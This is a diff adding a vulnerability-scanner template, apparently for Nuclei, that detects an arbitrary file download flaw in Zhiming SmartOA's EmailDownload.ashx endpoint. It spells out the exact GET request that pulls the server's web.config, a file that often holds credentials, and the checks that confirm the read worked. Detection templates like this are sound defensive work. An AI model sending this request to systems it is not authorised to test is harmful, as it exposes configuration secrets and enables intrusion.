@@ -1,0 +1,29 @@
+id: zh-smartoa-emaildownload-anyfile-read
+info:
+  name: Zhiming SmartOA EmailDownload.ashx Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file download vulnerability in Zhiming SmartOA's EmailDownload.ashx endpoint.
+
+http:
+  - raw:
+      - |
+        GET /file/EmailDownload.ashx?url=~/web.config&name=web.config HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "<appSettings>"
+      - type: word
+        part: header
+        words:
+          - "filename=web.config"
